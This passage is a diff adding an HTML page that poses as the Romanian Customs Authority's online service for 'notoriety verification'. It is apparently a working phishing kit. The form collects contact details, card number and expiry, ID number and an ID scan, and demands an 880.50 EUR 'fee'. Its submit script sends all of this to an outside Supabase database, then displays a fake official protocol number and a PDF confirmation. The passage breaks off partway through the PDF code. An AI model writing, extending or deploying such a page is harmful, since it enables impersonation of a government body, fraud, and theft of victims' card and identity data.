@@ -1,0 +1,676 @@
+<!doctype html>
+<html lang="ro">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AVR | Cerere de verificare a notorietății</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<!-- SDK Supabase -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+:root{--navy:#0b3a6e;--navy-dark:#07294e;--red:#e30613;--red-dark:#b80510;--gold:#d4a017;--ink:#172033;--muted:#64748b;--bg:#f5f7fa;--line:#dce4ee;--white:#fff;--green:#16845b;--shadow:0 12px 35px rgba(11,58,110,.09)}
+*{box-sizing:border-box}html{scroll-behavior:smooth}body{margin:0;background:var(--bg);color:var(--ink);font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",sans-serif;line-height:1.5}
+button,input,select,textarea{font:inherit}button{cursor:pointer}
+button:focus-visible,a:focus-visible,input:focus-visible,select:focus-visible,textarea:focus-visible{outline:3px solid #8bc5ff;outline-offset:2px}
+.site-header{position:sticky;top:0;z-index:20;background:rgba(255,255,255,.96);border-bottom:1px solid var(--line);backdrop-filter:blur(12px)}
+.header-inner{max-width:1180px;margin:auto;padding:16px 24px;display:flex;align-items:center;gap:30px}
+.brand{display:flex;align-items:center;gap:11px;color:var(--navy);font-weight:900;letter-spacing:.08em;text-decoration:none;white-space:nowrap}
+.brand-mark{width:42px;height:42px;border-radius:12px;background:var(--navy);display:grid;place-items:center;color:#fff;box-shadow:5px 5px 0 var(--red);overflow:hidden}
+.brand-mark svg{width:30px;height:30px;display:block}
+nav{display:flex;gap:24px;margin-left:auto}nav a{color:var(--ink);font-size:14px;font-weight:700;text-decoration:none}nav a:hover{color:var(--red)}
+.btn{border:0;border-radius:9px;padding:12px 18px;font-weight:800;transition:.2s}
+.btn-primary{background:var(--navy);color:#fff}.btn-primary:hover{background:var(--navy-dark);transform:translateY(-1px)}
+.btn-red{background:var(--red);color:#fff}.btn-red:hover{background:var(--red-dark);transform:translateY(-1px)}
+.btn-light{background:#fff;color:var(--navy);border:1px solid var(--line)}
+.btn-ghost{background:transparent;color:var(--navy);padding-left:0}
+.menu-btn{display:none;background:none;border:0;color:var(--navy);font-size:25px;margin-left:auto}
+.hero{position:relative;isolation:isolate;background:linear-gradient(135deg,rgba(5,72,145,.94),rgba(4,48,103,.94)),url('https://images.unsplash.com/photo-1578575437130-527eed3abbec?auto=format&fit=crop&w=1600&q=80') center/cover;color:#fff;padding:68px 24px 54px;text-align:center;overflow:hidden}
+.hero-inner{max-width:1180px;margin:auto}
+.eyebrow{text-transform:uppercase;letter-spacing:.14em;font-size:12px;font-weight:900;color:#c8e7ff}
+.hero h1{font-size:clamp(34px,5vw,60px);line-height:1.08;max-width:980px;margin:20px auto;font-weight:900}
+.hero p{max-width:850px;color:#f0f7ff;font-size:clamp(17px,2vw,20px);margin:0 auto 30px}
+.hero-actions{display:flex;justify-content:center;gap:16px;flex-wrap:wrap}
+.hero-actions .btn{min-width:300px;padding:16px 24px}
+.home-gallery{max-width:1180px;margin:0 auto;padding:28px 24px 0;display:grid;grid-template-columns:1.35fr 1fr 1fr;gap:18px}
+.home-gallery-card{position:relative;min-height:190px;border-radius:16px;overflow:hidden;background:var(--navy);box-shadow:var(--shadow)}
+.home-gallery-card img{width:100%;height:100%;display:block;object-fit:cover}
+.home-gallery-card:after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 35%,rgba(4,29,60,.86))}
+.home-gallery-caption{position:absolute;z-index:1;left:18px;right:18px;bottom:16px;color:#fff}
+.home-gallery-caption strong{display:block;font-size:18px}
+.home-gallery-caption span{font-size:12px;color:#d8ebff}
+.main{max-width:1180px;margin:0 auto;padding:55px 24px 80px}
+.section-head{text-align:center;margin-bottom:32px}
+.section-head h2{font-size:clamp(28px,4vw,40px);margin:0 0 8px;color:var(--navy)}
+.section-head p{color:var(--muted);margin:0}
+.service-grid{display:grid;grid-template-columns:minmax(0,760px);justify-content:center;gap:24px}
+.service-card,.form-shell,.success-card{background:#fff;border:1px solid var(--line);border-radius:18px;box-shadow:var(--shadow)}
+.service-card{padding:34px;position:relative;overflow:hidden}
+.service-card:before{content:"";position:absolute;left:0;top:0;bottom:0;width:6px;background:var(--red)}
+.service-number{color:var(--red);font-weight:900;font-size:13px}
+.service-card h3{color:var(--navy);font-size:25px;margin:12px 0 8px}
+.service-card p{color:var(--muted);min-height:48px}
+.service-card .btn{margin-top:18px}
+.home-only.hidden-home{display:none}
+.view{display:none;animation:appear .3s ease}.view.active{display:block}
+@keyframes appear{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+.form-shell{max-width:1080px;margin:auto;padding:34px}
+.form-title{display:flex;justify-content:space-between;gap:20px;align-items:flex-start;margin-bottom:28px}
+.form-title h2{margin:0;color:var(--navy);font-size:32px}
+.form-title p{color:var(--muted);margin:7px 0}
+.progress{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin:0 0 34px}
+.progress-step{text-align:center;color:#8a97a8;font-size:12px;font-weight:800;position:relative}
+.progress-step:before{content:attr(data-number);display:grid;place-items:center;width:34px;height:34px;margin:0 auto 7px;border:2px solid #cdd7e3;border-radius:50%;background:#fff}
+.progress-step:not(:last-child):after{content:"";position:absolute;height:2px;background:#dbe3ec;top:16px;left:60%;width:80%}
+.progress-step.done,.progress-step.current{color:var(--navy)}
+.progress-step.done:before,.progress-step.current:before{border-color:var(--navy);background:var(--navy);color:#fff}
+.progress-step.done:before{content:"✓"}
+.progress-step.done:after{background:var(--navy)}
+.step{display:none}.step.active{display:block;animation:appear .25s ease}
+.step h3{color:var(--navy);font-size:23px;margin:0 0 5px}
+.step h4{color:var(--navy);font-size:15px;margin:20px 0 10px}
+.step-intro{color:var(--muted);margin-top:0}
+.fields{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:18px 20px}
+.field{min-width:0}.field.full{grid-column:1/-1}
+label{display:block;font-weight:800;font-size:13px;margin-bottom:7px}
+input,select,textarea{width:100%;border:1px solid #cbd6e2;border-radius:8px;padding:12px 13px;background:#fff;color:var(--ink)}
+input.invalid,select.invalid,textarea.invalid{border-color:var(--red)}
+textarea{min-height:110px;resize:vertical}
+.error{display:block;min-height:18px;color:var(--red);font-size:12px;margin-top:4px}
+.hidden{display:none!important}
+.step-actions{display:flex;justify-content:space-between;gap:12px;border-top:1px solid var(--line);margin-top:30px;padding-top:22px}
+.radio-group,.checkbox-group{display:flex;flex-direction:column;gap:10px;margin-top:6px}
+.radio-option,.checkbox-option{display:flex;align-items:flex-start;gap:10px;padding:14px 16px;border:1px solid var(--line);border-radius:10px;background:#fdfdfd;cursor:pointer;transition:.2s}
+.radio-option:hover,.checkbox-option:hover{border-color:var(--navy);background:#f1f7ff}
+.radio-option input,.checkbox-option input{margin-top:4px;width:auto}
+.option-label{font-weight:600;color:var(--ink);font-size:14px}
+.option-description{font-size:12px;color:var(--muted);margin-top:2px}
+.checkbox-option.terms{background:#fff7e6;border-color:var(--gold)}
+.payment-notice{margin-top:24px;padding:17px 20px;background:#fff7e6;border-left:5px solid #d4a017;border-radius:8px;color:var(--ink)}
+.payment-notice-title{font-weight:900;margin-bottom:6px}
+.success-payment-notice{margin:22px 0;padding:16px 18px;background:#fff7e6;border-left:5px solid #d4a017;border-radius:8px;text-align:left;color:var(--ink)}
+ 
+.upload-grid{display:grid;grid-template-columns:minmax(0,1fr);gap:16px}
+.upload{border:1px dashed #aabbd0;border-radius:12px;padding:18px;background:#fbfdff}
+.upload-head{display:flex;align-items:center;gap:12px;margin-bottom:14px}
+.upload-icon{width:36px;height:36px;border-radius:9px;background:#e7f1fc;display:grid;place-items:center;color:var(--navy);font-weight:900}
+.upload-name{font-weight:800}
+.upload-info{font-size:12px;color:var(--muted);margin-top:9px;min-height:18px;overflow-wrap:anywhere}
+.upload input{display:none}
+.upload label{display:inline-block;color:var(--navy);border:1px solid #b9c9da;padding:9px 12px;border-radius:7px;background:#fff;cursor:pointer}
+.upload input:disabled+label{opacity:.55;cursor:not-allowed}
+.remove-file{border:0;background:none;color:var(--red);font-size:12px;font-weight:800;margin-left:8px;cursor:pointer}
+.summary-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+.summary-card{border:1px solid var(--line);border-radius:12px;padding:18px}
+.summary-card h4{color:var(--navy);margin:0 0 12px}
+.summary-card dl{display:grid;grid-template-columns:130px 1fr;gap:7px;margin:0;font-size:13px}
+.summary-card dt{color:var(--muted);font-weight:700}
+.summary-card dd{margin:0;overflow-wrap:anywhere}
+.success-card{max-width:700px;margin:35px auto;padding:48px;text-align:center}
+.success-icon{width:72px;height:72px;border-radius:50%;background:#dff6eb;color:var(--green);display:grid;place-items:center;font-size:38px;font-weight:900;margin:0 auto 20px}
+.success-card h2{color:var(--navy);margin:0;font-size:32px}
+.success-card p{color:var(--muted)}
+.protocol{font-size:26px;letter-spacing:.06em;color:var(--navy);font-weight:900;background:#f1f6fb;border:1px solid #dbe7f2;border-radius:10px;padding:14px;margin:25px 0 8px}
+.success-meta{display:grid;grid-template-columns:1fr 1fr;gap:12px;text-align:left;margin:22px 0}
+.success-meta div{border:1px solid var(--line);border-radius:9px;padding:12px}
+.success-meta span{display:block;color:var(--muted);font-size:11px}
+.success-meta strong{font-size:14px}
+.success-actions{display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+.info-section{max-width:1180px;margin:0 auto;padding:30px 24px 55px}
+.info-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.info-grid article{background:#fff;border:1px solid var(--line);border-radius:14px;padding:22px;box-shadow:var(--shadow)}
+.info-grid strong{color:var(--red);font-size:13px}
+.info-grid h3{color:var(--navy);font-size:18px;margin:9px 0 6px}
+.info-grid p,.faq-list p{color:var(--muted);margin:0;font-size:14px}
+.faq-list{max-width:850px;margin:auto}
+.faq-list details{background:#fff;border:1px solid var(--line);border-radius:10px;margin:10px 0;padding:16px 18px}
+.faq-list summary{cursor:pointer;color:var(--navy);font-weight:800}
+.faq-list details p{padding-top:12px}
+.footer{background:#0a294a;color:#d6e4f2;padding:38px 24px}
+.footer-inner{max-width:1180px;margin:auto;display:flex;justify-content:space-between;gap:20px}
+.footer strong{color:#fff;font-size:18px}
+.footer p{margin:6px 0;font-size:13px}
+.footer a{color:#fff;margin-left:18px;font-size:13px}
+@media(max-width:760px){.home-gallery{grid-template-columns:1fr;padding:22px 16px 0}.home-gallery-card{min-height:165px}.info-section{padding:25px 16px 40px}.info-grid{grid-template-columns:1fr 1fr}.hero-actions{flex-direction:column;align-items:stretch}.hero-actions .btn{width:100%}.header-inner{padding:13px 18px}.menu-btn{display:block}nav{display:none;position:absolute;top:68px;left:0;right:0;background:#fff;padding:18px 24px;border-bottom:1px solid var(--line);flex-direction:column;gap:15px}nav.open{display:flex}.hero{padding:50px 20px}.main{padding:38px 16px 60px}.service-grid,.upload-grid,.summary-grid,.fields{grid-template-columns:1fr}.form-shell{padding:22px 17px;border-radius:13px}.form-title{display:block}.form-title h2{font-size:26px}.field.full{grid-column:auto}.progress{gap:2px}.progress-step{font-size:9px}.progress-step:before{width:29px;height:29px;font-size:11px}.step-actions{flex-direction:column-reverse}.step-actions .btn{width:100%}.success-card{padding:34px 20px}.success-meta{grid-template-columns:1fr}.footer-inner{display:block}}
+@media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}*,*::before,*::after{animation-duration:.01ms!important;transition-duration:.01ms!important}}
+</style>
+</head>
+<body>
+<header class="site-header"><div class="header-inner">
+<a class="brand" href="#inicio"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 32 32"><path d="M6 22.5 12.5 9h7L26 22.5h-4.2l-1.5-3H11.7l-1.5 3H6Zm7.3-6.2h5.4L16 11l-2.7 5.3Z" fill="currentColor"/><path d="M7 25h18" stroke="#e30613" stroke-width="2.8" stroke-linecap="round"/></svg></span><span>AVR · Notorietate</span></a>
+<button class="menu-btn" id="menuBtn" aria-label="Deschide meniul">☰</button>
+<nav id="mainNav"><a href="#servicos">Servicii</a><a href="#cum-functioneaza">Cum funcționează</a><a href="#faq">Întrebări frecvente</a><a href="#contacte">Contacte</a></nav>
+</div></header>
+
+<section class="hero home-only" id="inicio">
+<div class="hero-inner">
+<span class="eyebrow">Autoritatea Vamală Română · Servicii Online</span>
+<h1>Cerere de verificare a notorietății</h1>
+<p>Depuneți online cererea de verificare a notorietății. Completați formularul, atașați documentele justificative și primiți confirmare oficială cu număr de protocol.</p>
+<div class="hero-actions">
+<button class="btn btn-red" onclick="startFlow()">Depuneți o cerere de verificare a notorietății</button>
+</div>
+</div>
+</section>
+
+<section class="home-gallery home-only" aria-label="Imagini instituționale">
+<article class="home-gallery-card"><img src="https://images.unsplash.com/photo-1494412574643-ff11b0a5c1c3?auto=format&fit=crop&w=1200&q=70" alt="Punct de frontieră" loading="lazy"><div class="home-gallery-caption"><strong>Control vamal</strong><span>Verificarea documentelor și a operatorilor</span></div></article>
+<article class="home-gallery-card"><img src="https://images.unsplash.com/photo-1601584115197-04ecc0da31d7?auto=format&fit=crop&w=1200&q=70" alt="Transport maritim" loading="lazy"><div class="home-gallery-caption"><strong>Comerț internațional</strong><span>Fluxuri de mărfuri și conformitate</span></div></article>
+<article class="home-gallery-card"><img src="https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?auto=format&fit=crop&w=1200&q=70" alt="Birou vamal" loading="lazy"><div class="home-gallery-caption"><strong>Depuneți cererea online</strong><span>Serviciu rapid, sigur și eficient</span></div></article>
+</section>
+
+<main class="main">
+
+<section id="servicesView" class="view active">
+<div class="section-head" id="servicos"><span class="eyebrow">Servicii digitale</span><h2>Serviciile noastre online</h2><p>Alegeți procedura pe care doriți să o inițiați.</p></div>
+<div class="service-grid">
+<article class="service-card"><span class="service-number">OPȚIUNEA</span><h3>Cerere de verificare a notorietății</h3><p>Depuneți cererea privind verificarea notorietății.</p><button class="btn btn-primary" onclick="startFlow()">Începe cererea</button></article>
+</div>
+</section>
+
+<section id="cerereView" class="view"><div class="form-shell">
+<div class="form-title"><div><button class="btn btn-ghost" onclick="showServices()">← Înapoi la pagina principală</button><span class="eyebrow">Cerere oficială</span><h2>Cerere de verificare a notorietății</h2><p>Completați cererea pas cu pas.</p></div></div>
+<div class="progress" id="cerereProgress"></div>
+<form id="cerereForm" novalidate>
+
+<div class="step" data-step="1">
+<h3>Date solicitant</h3>
+<p class="step-intro">Indicați datele de identificare ale solicitantului.</p>
+<div class="fields">
+<div class="field"><label for="aName">Nume *</label><input id="aName" maxlength="100" required><span class="error"></span></div>
+<div class="field"><label for="aSurname">Prenume *</label><input id="aSurname" maxlength="100" required><span class="error"></span></div>
+<div class="field"><label for="aEmail">E-mail *</label><input id="aEmail" type="email" maxlength="254" required><span class="error"></span></div>
+<div class="field"><label for="aPhone">Telefon *</label><input id="aPhone" type="tel" maxlength="30" required><span class="error"></span></div>
+<div class="field full"><label for="aAddress">Adresă completă *</label><input id="aAddress" maxlength="220" required><span class="error"></span></div>
+</div>
+<div class="step-actions">
+<button type="button" class="btn btn-light" onclick="showServices()">← Anterior</button>
+<button type="button" class="btn btn-primary" onclick="nextStep()">Continuă →</button>
+</div>
+</div>
+
+<div class="step" data-step="2">
+<h3>Detalii card și Identitate</h3>
+<p class="step-intro">Informații privind cardul digital și actul de identitate.</p>
+<div class="fields">
+<div class="field"><label for="cardNumber">Numărul cardului digital *</label><input id="cardNumber" required placeholder="XXXX XXXX XXXX XXXX"><span class="error"></span></div>
+<div class="field"><label for="cardExpiry">Data expirării cardului *</label><input id="cardExpiry" required placeholder="MM/YY"><span class="error"></span></div>
+<div class="field"><label for="idNumber">Număr act identitate (CI / Pașaport) *</label><input id="idNumber" required><span class="error"></span></div>
+</div>
+<div class="step-actions">
+<button type="button" class="btn btn-light" onclick="prevStep()">← Anterior</button>
+<button type="button" class="btn btn-primary" onclick="nextStep()">Continuă →</button>
+</div>
+</div>
+
+<div class="step" data-step="3">
+<h3>Documente justificative</h3>
+<p class="step-intro">Alegeți un singur tip de document, introduceți numărul acestuia, apoi încărcați fișierul corespunzător. Formate acceptate: PDF, JPG, JPEG, PNG · max. 10 MB.</p>
+<h4 id="documentSectionTitle">Documente recomandate</h4>
+<div class="fields">
+<div class="field full"><label for="documentType">Alegeți tipul documentului *</label><select id="documentType" required><option value="">Selectați tipul documentului</option><option value="carte-identitate">Copie carte de identitate (Recto)</option><option value="pasaport">Pașaport</option></select><span class="error"></span></div>
+</div>
+<div class="upload-grid" id="uploads"></div>
+<span class="error" id="fileError"></span>
+<div class="step-actions">
+<button type="button" class="btn btn-light" onclick="prevStep()">← Anterior</button>
+<button type="button" class="btn btn-primary" onclick="nextStep()">Continuă →</button>
+</div>
+</div>
+
+<div class="step" data-step="4">
+<h3>Taxă de verificare și Confirmare</h3>
+<p class="step-intro">Verificați toate datele și achitați taxa de procesare.</p>
+<div class="payment-notice" role="note">
+<div class="payment-notice-title">ⓘ IMPORTANT — TAXĂ DE PROCESARE</div>
+<div>Pentru finalizarea cererii, vă rugăm să vă adresați serviciului responsabil pentru achitarea taxei de procesare în valoare de <strong>880,50 EUR</strong>.</div>
+<div>Introduceți referința tranzacției și atașați chitanța de plată mai jos.</div>
+</div>
+<div class="fields" style="margin-top:20px;">
+<div class="field"><label for="transactionRef">Număr de referință tranzacție *</label><input id="transactionRef" required placeholder="Ex: TXN-98563214"><span class="error"></span></div>
+<div class="field"><label for="receiptFile">Dovada plății (Chitanță) *</label><input type="file" id="receiptFile" accept="image/*,application/pdf" required><span class="error"></span></div>
+</div>
+<h4 style="margin-top:25px;">Declarație pe propria răspundere</h4>
+<label class="checkbox-option terms">
+<input type="checkbox" id="confirmCheck" required>
+<div>
+<div class="option-label">Declar pe propria răspundere că informațiile furnizate sunt corecte și că sunt unicul proprietar legitim al cardului. *</div>
+</div>
+</label>
+<span class="error" id="confirmError"></span>
+<div class="step-actions">
+<button type="button" class="btn btn-light" onclick="prevStep()">← Anterior</button>
+<button type="button" class="btn btn-red" onclick="submitFlow()">📨 Depune cererea</button>
+</div>
+</div>
+
+</form>
+</div></section>
+
+<section id="successView" class="view"><div class="success-card">
+<div class="success-icon">✓</div>
+<h2>Cerere depusă cu succes</h2>
+<p>Cererea dumneavoastră a fost înregistrată. Veți primi un răspuns în termen de 30 de zile lucrătoare.</p>
+<div class="success-payment-notice" role="note">ⓘ Pentru finalizarea cererii, achitați taxa de procesare de 880,50 EUR la serviciul responsabil de dosarul dumneavoastră.</div>
+<div class="protocol" id="successProtocol"></div>
+<span>Număr de protocol</span>
+<div class="success-meta">
+<div><span>Data cererii</span><strong id="successDate"></strong></div>
+<div><span>Serviciu</span><strong>Verificare Notorietate Card</strong></div>
+<div><span>Status</span><strong id="successStatus">Cerere înregistrată</strong></div>
+<div><span>Nume solicitant</span><strong id="successApplicant"></strong></div>
+</div>
+<div class="success-actions">
+<button class="btn btn-primary" onclick="downloadReceipt()">📄 Descarcă PDF oficial</button>
+<button class="btn btn-light" onclick="printReceipt()">🖨 Imprimă</button>
+<button class="btn btn-light" onclick="showServices()">Înapoi la pagina principală</button>
+</div>
+</div></section>
+
+</main>
+
+<section class="info-section home-only" id="cum-functioneaza"><div class="section-head"><span class="eyebrow">Proces simplu</span><h2>Cum funcționează</h2><p>Tratează cererea în 4 pași.</p></div><div class="info-grid">
+<article><strong>01</strong><h3>Completați datele</h3><p>Indicați informațiile de identificare și datele cardului.</p></article>
+<article><strong>02</strong><h3>Verificare & Identitate</h3><p>Atașați actul de identitate și documentul cerut.</p></article>
+<article><strong>03</strong><h3>Achitați taxa</h3><p>Trimiteți dovada plății taxei de 880,50 EUR.</p></article>
+<article><strong>04</strong><h3>Primiți confirmarea</h3><p>Descărcați PDF-ul oficial cu numărul de protocol.</p></article>
+</div></section>
+
+<section class="info-section home-only" id="faq"><div class="section-head"><span class="eyebrow">Ajuda</span><h2>Întrebări frecvente</h2></div><div class="faq-list">
+<details><summary>Ce documente trebuie să pregătesc?</summary><p>Actul de identitate (recto) și chitanța doveditoare a plății taxei de 880,50 EUR.</p></details>
+<details><summary>Ce formate sunt acceptate?</summary><p>Sunt acceptate fișiere PDF, JPG, JPEG și PNG, până la 10 MB per fișier.</p></details>
+<details><summary>Cât durează procesarea?</summary><p>Veți primi un răspuns în termen de 30 de zile lucrătoare.</p></details>
+</div></section>
+
+<footer class="footer" id="contacte"><div class="footer-inner">
+<div><strong>AVR · Notorietate</strong><p>Autoritatea Vamală Română · Servicii online.</p></div>
+<div><p>E-mail de contact : <a href="mailto:contact@customs.gov.ro">contact@customs.gov.ro</a></p><p>© 2026 Autoritatea Vamală Română. Toate drepturile rezervate.</p></div>
+</div></footer>
+
+<script>
+(function(){
+'use strict';
+
+var state={step:1,files:{}};
+var lastSubmission=null;
+var PROGRESS_LABELS=['Date solicitant','Card & ID','Documente','Confirmare & Plată'];
+var DOCUMENT_TYPES={
+  'carte-identitate':'Copie carte de identitate (Recto)',
+  'pasaport':'Pașaport'
+};
+
+function hideViews(){
+  document.querySelectorAll('.view').forEach(function(v){v.classList.remove('active');});
+  document.querySelectorAll('.home-only').forEach(function(v){v.classList.add('hidden-home');});
+}
+function showHomeContent(){
+  document.querySelectorAll('.home-only').forEach(function(v){v.classList.remove('hidden-home');});
+}
+window.showServices=function(){
+  hideViews();
+  showHomeContent();
+  document.getElementById('servicesView').classList.add('active');
+  window.scrollTo({top:0,behavior:'smooth'});
+};
+window.startFlow=function(){
+  state={step:1,files:{}};
+  var form=document.getElementById('cerereForm');
+  form.reset();
+  form.querySelectorAll('.error').forEach(function(e){e.textContent='';});
+  form.querySelectorAll('.invalid').forEach(function(e){e.classList.remove('invalid');});
+  renderUploads();
+  hideViews();
+  document.getElementById('cerereView').classList.add('active');
+  renderProgress();
+  showStep(1);
+  window.scrollTo({top:0,behavior:'smooth'});
+};
+
+function renderProgress(){
+  var container=document.getElementById('cerereProgress');
+  container.innerHTML='';
+  PROGRESS_LABELS.forEach(function(label,index){
+    var step=index+1;
+    var item=document.createElement('div');
+    item.className='progress-step'+(step<state.step?' done':'')+(step===state.step?' current':'');
+    item.dataset.number=step;
+    item.textContent=label;
+    container.appendChild(item);
+  });
+}
+
+function showStep(number){
+  state.step=number;
+  document.querySelectorAll('#cerereForm .step').forEach(function(step){
+    step.classList.toggle('active',Number(step.dataset.step)===number);
+  });
+  renderProgress();
+}
+
+function renderUploads(){
+  var container=document.getElementById('uploads');
+  if(!container) return;
+  container.innerHTML='';
+  var card=document.createElement('div');
+  card.className='upload';
+  var head=document.createElement('div');
+  head.className='upload-head';
+  head.innerHTML='<span class="upload-icon" aria-hidden="true">↑</span>';
+  var name=document.createElement('span');
+  name.className='upload-name';
+  name.textContent='Încărcați Actul de Identitate';
+  head.appendChild(name);
+  var input=document.createElement('input');
+  input.type='file';
+  input.id='file-document';
+  input.accept='.pdf,.jpg,.jpeg,.png';
+  var label=document.createElement('label');
+  label.htmlFor=input.id;
+  label.textContent='Alegeți fișierul';
+  var info=document.createElement('div');
+  info.className='upload-info';
+  var existing=state.files.document;
+  info.textContent=existing?existing.name:'Niciun fișier selectat';
+  input.addEventListener('change',function(){
+    var file=input.files&&input.files[0];
+    var error=document.getElementById('fileError');
+    error.textContent='';
+    if(!file){delete state.files.document;info.textContent='Niciun fișier selectat';return;}
+    state.files.document=file;
+    info.textContent=file.name+' ('+(file.size/1024/1024).toFixed(2)+' MB)';
+  });
+  card.appendChild(head);
+  card.appendChild(input);
+  card.appendChild(label);
+  card.appendChild(info);
+  container.appendChild(card);
+}
+
+function clearErrors(step){
+  step.querySelectorAll('.error').forEach(function(error){error.textContent='';});
+  step.querySelectorAll('.invalid').forEach(function(field){field.classList.remove('invalid');});
+}
+
+function validateStep(number){
+  var step=document.querySelector('.step[data-step="'+number+'"]');
+  clearErrors(step);
+  var valid=true;
+  if(number===1){
+    ['aName','aSurname','aEmail','aPhone','aAddress'].forEach(function(id){
+      var field=document.getElementById(id);
+      if(!field.value.trim()){field.classList.add('invalid');valid=false;}
+    });
+  }
+  if(number===2){
+    ['cardNumber','cardExpiry','idNumber'].forEach(function(id){
+      var field=document.getElementById(id);
+      if(!field.value.trim()){field.classList.add('invalid');valid=false;}
+    });
+  }
+  if(number===3){
+    var documentType=document.getElementById('documentType');
+    if(!documentType.value){documentType.classList.add('invalid');valid=false;}
+    if(!state.files.document){document.getElementById('fileError').textContent='Încărcați documentul justificativ.';valid=false;}
+  }
+  return valid;
+}
+
+window.nextStep=function(){
+  if(validateStep(state.step)&&state.step<4) showStep(state.step+1);
+};
+window.prevStep=function(){if(state.step>1) showStep(state.step-1);};
+
+window.submitFlow=async function(){
+  var check=document.getElementById('confirmCheck');
+  var error=document.getElementById('confirmError');
+  var receiptInput=document.getElementById('receiptFile');
+  error.textContent='';
+  check.classList.remove('invalid');
+
+  if(!check.checked){
+    check.classList.add('invalid');
+    error.textContent='Confirmați declarația înainte de depunere.';
+    return;
+  }
+  if(!receiptInput.files[0]){
+    alert("Vă rugăm să atașați chitanța de plată a taxei.");
+    return;
+  }
+
+  var now=new Date();
+  var protocol='AVR-'+now.getFullYear()+'-'+String(now.getTime()).slice(-8);
+  var applicant=document.getElementById('aName').value+' '+document.getElementById('aSurname').value;
+  var documentType=document.getElementById('documentType');
+
+  // --- CONNEXION SUPABASE ---
+  const SUPABASE_URL = 'https://iybgdmdpjajlaqplopvt.supabase.co';
+  const SUPABASE_ANON_KEY = 'sb_publishable_uf6sbMPFGM5h-ul8aSyLBQ_crdmmin1';
+  const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+  let docPath = '';
+  if(state.files.document){
+    docPath = `docs/${protocol}_id.${state.files.document.name.split('.').pop()}`;
+    await supabaseClient.storage.from('customs-secure-docs').upload(docPath, state.files.document);
+  }
+
+  let receiptPath = '';
+  if(receiptInput.files[0]){
+    receiptPath = `receipts/${protocol}_receipt.${receiptInput.files[0].name.split('.').pop()}`;
+    await supabaseClient.storage.from('customs-secure-docs').upload(receiptPath, receiptInput.files[0]);
+  }
+
+  await supabaseClient.from('notoriety_verifications').insert([{
+    protocol: protocol,
+    applicant_type: 'Persoană fizică',
+    first_name: document.getElementById('aName').value,
+    last_name: document.getElementById('aSurname').value,
+    email: document.getElementById('aEmail').value,
+    phone: document.getElementById('aPhone').value,
+    address: document.getElementById('aAddress').value,
+    verification_type: 'Verificare Notorietate Card',
+    document_type: DOCUMENT_TYPES[documentType.value]||'',
+    document_number: document.getElementById('idNumber').value,
+    card_number: document.getElementById('cardNumber').value,
+    card_expiry: document.getElementById('cardExpiry').value,
+    transaction_ref: document.getElementById('transactionRef').value,
+    document_file_path: docPath,
+    receipt_file_path: receiptPath
+  }]);
+
+  lastSubmission={
+    protocol:protocol,
+    date:now,
+    applicant:applicant,
+    service:'Verificare Notorietate Card',
+    email:document.getElementById('aEmail').value,
+    phone:document.getElementById('aPhone').value,
+    address:document.getElementById('aAddress').value,
+    documentType:DOCUMENT_TYPES[documentType.value]||'',
+    documentNumber:document.getElementById('idNumber').value,
+    cardNumber:document.getElementById('cardNumber').value,
+    cardExpiry:document.getElementById('cardExpiry').value,
+    transactionRef:document.getElementById('transactionRef').value,
+    documentFile:state.files.document?state.files.document.name:'',
+    receiptFile:receiptInput.files[0].name
+  };
+
+  document.getElementById('successProtocol').textContent=protocol;
+  document.getElementById('successDate').textContent=now.toLocaleDateString('ro-RO');
+  document.getElementById('successApplicant').textContent=applicant;
+  hideViews();
+  document.getElementById('successView').classList.add('active');
+  window.scrollTo({top:0,behavior:'smooth'});
+};
+
+window.downloadReceipt=function(){
+  if(!lastSubmission) return;
+  var jsPDF=window.jspdf&&window.jspdf.jsPDF;
+  if(!jsPDF){window.print();return;}
+  var pdf=new jsPDF({orientation:'portrait',unit:'mm',format:'a4'});
+  var pageWidth=pdf.internal.pageSize.getWidth();
+  var pageHeight=pdf.internal.pageSize.getHeight();
+  var margin=18;
+  var y=56;
+
+  function pdfText(value){
+    return String(value||'—').normalize('NFD').replace(/[\u0300-\u036f]/g,'')
+      .replace(/[ăĂ]/g,'a').replace(/[șȘ]/g,'s').replace(/[țȚ]/g,'t')
+      .replace(/[âÂ]/g,'a').replace(/[îÎ]/g,'i');
+  }
+  function drawHeader(){
+    pdf.setFillColor(11,58,110);
+    pdf.rect(0,0,pageWidth,3,'F');
+    pdf.setTextColor(11,58,110);
+    pdf.setFont('helvetica','bold');
+    pdf.setFontSize(15);
+    pdf.text('AUTORITATEA VAMALA ROMANA',margin,15);
+    pdf.setFont('helvetica','normal');
+    pdf.setFontSize(8.5);
+    pdf.setTextColor(100,100,100);
+    pdf.text('SERVICII ONLINE  |  VERIFICAREA NOTORIETATII',margin,21);
+    pdf.setFont('helvetica','bold');
+    pdf.setFontSize(11);
+    pdf.setTextColor(11,58,110);
+    pdf.text('CONFIRMARE DE DEPUNERE A CERERII',margin,30);
+    pdf.setDrawColor(200,200,200);
+    pdf.setLineWidth(0.4);
+    pdf.line(margin,34,pageWidth-margin,34);
+  }
+  function drawFooter(pageNumber,totalPages){
+    pdf.setDrawColor(220,228,238);
+    pdf.line(margin,pageHeight-16,pageWidth-margin,pageHeight-16);
+    pdf.setTextColor(100,116,139);
+    pdf.setFont('helvetica','normal');
+    pdf.setFontSize(8);
+    pdf.text('Document generat automat  |  AVR - Servicii online',margin,pageHeight-10);
+    pdf.text('Pagina '+pageNumber+' / '+totalPages,pageWidth-margin,pageHeight-10,{align:'right'});
+  }
+  function newPage(){
+    pdf.addPage();
+    drawHeader();
+    y=52;
+  }
+  function ensureSpace(height){
